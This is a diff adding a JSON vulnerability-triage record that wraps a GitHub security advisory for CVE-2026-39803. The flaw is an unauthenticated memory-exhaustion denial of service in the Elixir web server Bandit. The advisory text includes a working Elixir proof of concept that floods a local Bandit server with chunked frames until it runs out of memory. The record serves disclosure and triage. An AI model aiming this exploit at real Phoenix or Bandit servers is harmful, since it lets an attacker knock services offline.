@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/10426523?v=4\", \"events_url\": \"https://api.github.com/users/PJUllrich/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/PJUllrich/followers\", \"following_url\": \"https://api.github.com/users/PJUllrich/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/PJUllrich/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/PJUllrich\", \"id\": 10426523, \"login\": \"PJUllrich\", \"node_id\": \"MDQ6VXNlcjEwNDI2NTIz\", \"organizations_url\": \"https://api.github.com/users/PJUllrich/orgs\", \"received_events_url\": \"https://api.github.com/users/PJUllrich/received_events\", \"repos_url\": \"https://api.github.com/users/PJUllrich/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/PJUllrich/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/PJUllrich/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/PJUllrich\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/79646?v=4\", \"events_url\": \"https://api.github.com/users/mtrudel/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/mtrudel/followers\", \"following_url\": \"https://api.github.com/users/mtrudel/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/mtrudel/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/mtrudel\", \"id\": 79646, \"login\": \"mtrudel\", \"node_id\": \"MDQ6VXNlcjc5NjQ2\", \"organizations_url\": \"https://api.github.com/users/mtrudel/orgs\", \"received_events_url\": \"https://api.github.com/users/mtrudel/received_events\", \"repos_url\": \"https://api.github.com/users/mtrudel/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/mtrudel/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/mtrudel/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/mtrudel\", \"user_view_type\": \"public\"}}, {\"type\": \"coordinator\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/333918?v=4\", \"events_url\": \"https://api.github.com/users/maennchen/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/maennchen/followers\", \"following_url\": \"https://api.github.com/users/maennchen/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/maennchen/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/maennchen\", \"id\": 333918, \"login\": \"maennchen\", \"node_id\": \"MDQ6VXNlcjMzMzkxOA==\", \"organizations_url\": \"https://api.github.com/users/maennchen/orgs\", \"received_events_url\": \"https://api.github.com/users/maennchen/received_events\", \"repos_url\": \"https://api.github.com/users/maennchen/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/maennchen/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/maennchen/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/maennchen\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-39803\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"### Summary\\n\\nBandit's HTTP/1 chunked-body reader silently drops the request size cap that the application configures (e.g. `Plug.Parsers`' default 8 MB `length:`) and buffers the entire body in memory before the application sees it. An unauthenticated attacker can crash any Bandit-fronted Phoenix/Plug app (BEAM OOM) with a single `Transfer-Encoding: chunked` request to any URL.\\n\\n### Details\\n\\nIn `lib/bandit/http1/socket.ex:189`, the chunked clause of `read_data/2` only forwards `:read_length` and `:read_timeout` to `do_read_chunked_data!/5` (`:242`); the caller-supplied `:length` cap is dropped. The recursion accumulates every chunk into an iolist and `IO.iodata_to_binary/1` (`:196`) materializes the whole thing as one binary. The function always returns `{:ok, body, ...}` — never `{:more, ...}` — so callers cannot interpose a 413.\\n\\nThe content-length sibling at `:210` does the right thing:\\n\\n```elixir\\nmax_to_return = min(unread_content_length, Keyword.get(opts, :length, 8_000_000))\\n```\\n\\nBecause `Plug.Parsers` runs before routing and auth in the standard Phoenix endpoint, the attacker needs no credentials and no valid route — any `Content-Type` matching a configured parser (`:json`, `:urlencoded`, `:multipart`) on any path triggers the bug.\\n\\n**Suggested Fix:** track accumulated bytes in `do_read_chunked_data!` and either return `{:more, ...}` or raise `request_error!` once `:length` is exceeded, mirroring the content-length path.\\n\\n### PoC\\n\\nSelf-contained — boots a Bandit server with a realistic `Plug.Parsers` (`length: 8_000_000`) and floods it. Save as `chunked_oom.exs`, run `elixir chunked_oom.exs`, and watch `beam.smp` RSS climb past 8 MB until the OS OOM-killer fires.\\n\\n```elixir\\nMix.install([{:bandit, \\\"~> 1.10\\\"}, {:plug, \\\"~> 1.19\\\"}])\\n\\ndefmodule DemoApp do\\n  use Plug.Builder\\n\\n  # The `length` option here is ignored by the attack\\n  plug Plug.Parsers, parsers: [:urlencoded, :json], pass: [\\\"*/*\\\"], json_decoder: JSON, length: 8_000_000\\n  plug :respond\\n\\n  def respond(conn, _), do: Plug.Conn.send_resp(conn, 200, \\\"ok\\\")\\nend\\n\\n{:ok, _} = Bandit.start_link(plug: DemoApp, ip: {127, 0, 0, 1}, port: 4321)\\n\\n# Builds a single 1MB chunk that is reused on the client-side but accumulated on the server-side.\\nchunk = :binary.copy(<<?A>>, 1_048_576)\\nframe = \\\"#{Integer.to_string(1_048_576, 16)}\\\\r\\\\n#{chunk}\\\\r\\\\n\\\"\\n\\n{:ok, sock} = :gen_tcp.connect(~c\\\"127.0.0.1\\\", 4321, [:binary, active: false])\\n\\n:ok =\\n  :gen_tcp.send(sock, \\\"\\\"\\\"\\n  POST / HTTP/1.1\\\\r\\n  Host: 127.0.0.1\\\\r\\n  Transfer-Encoding: chunked\\\\r\\n  Content-Type: application/json\\\\r\\n  Connection: close\\\\r\\n  \\\\r\\n  \\\"\\\"\\\")\\n\\nEnum.each(1..10_240, fn _ -> :ok = :gen_tcp.send(sock, frame) end)\\n:ok = :gen_tcp.send(sock, \\\"0\\\\r\\\\n\\\\r\\\\n\\\")\\n\\nIO.inspect(:gen_tcp.recv(sock, 0, 120_000))\\n```\\n\\n### Impact\\n\\nUnauthenticated pre-route DoS via BEAM memory exhaustion. One request from one connection crashes the server. Affects every Bandit-fronted application that reads request bodies anywhere — i.e. essentially every Phoenix app, since the default endpoint mounts `Plug.Parsers` ahead of routing and auth. Configured `length:` caps on `Plug.Parsers` and `Plug.Conn.read_body/2` are silently ineffective on the chunked path.\", \"epss\": {\"percentage\": 0.00642, \"percentile\": 0.46522}, \"ghsa_id\": \"GHSA-9q9q-324x-93r2\", \"github_reviewed_at\": \"2026-05-19T19:23:49Z\", \"html_url\": \"https://github.com/advisories/GHSA-9q9q-324x-93r2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9q9q-324x-93r2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-39803\"}], \"nvd_published_at\": \"2026-05-13T14:17:32Z\", \"published_at\": \"2026-05-19T19:23:49Z\", \"references\": [\"https://github.com/mtrudel/bandit/security/advisories/GHSA-9q9q-324x-93r2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-39803\", \"https://github.com/mtrudel/bandit/commit/ae3520dfdbfab115c638f8c7f6f6b805db34e1ab\", \"https://cna.erlef.org/cves/CVE-2026-39803.html\", \"https://osv.dev/vulnerability/EEF-CVE-2026-39803\", \"https://github.com/advisories/GHSA-9q9q-324x-93r2\"], \"repository_advisory_url\": \"https://api.github.com/repos/mtrudel/bandit/security-advisories/GHSA-9q9q-324x-93r2\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/mtrudel/bandit\", \"summary\": \"Bandit: Unauthenticated one-shot DoS via `Transfer-Encoding: chunked`\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T20:17:14Z\", \"url\": \"https://api.github.com/advisories/GHSA-9q9q-324x-93r2\", \"vulnerabilities\": [{\"first_patched_version\": \"1.11.1\", \"package\": {\"ecosystem\": \"erlang\", \"name\": \"bandit\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.4.0, < 1.11.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9q9q-324x-93r2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "bandit: >= 1.4.0, < 1.11.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-39803"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "bandit"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.282372Z",
+  "provenance": {
+    "content_sha256": "6e9c5f4232a29231d9934e94d13f184e62f8b5c88623200e64b1697849032c72",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-19T19:23:49Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9q9q-324x-93r2",
+  "status": "active",
+  "title": "Bandit: Unauthenticated one-shot DoS via `Transfer-Encoding: chunked`",
+  "updated_at": "2026-06-08T20:17:14Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9q9q-324x-93r2"
+}
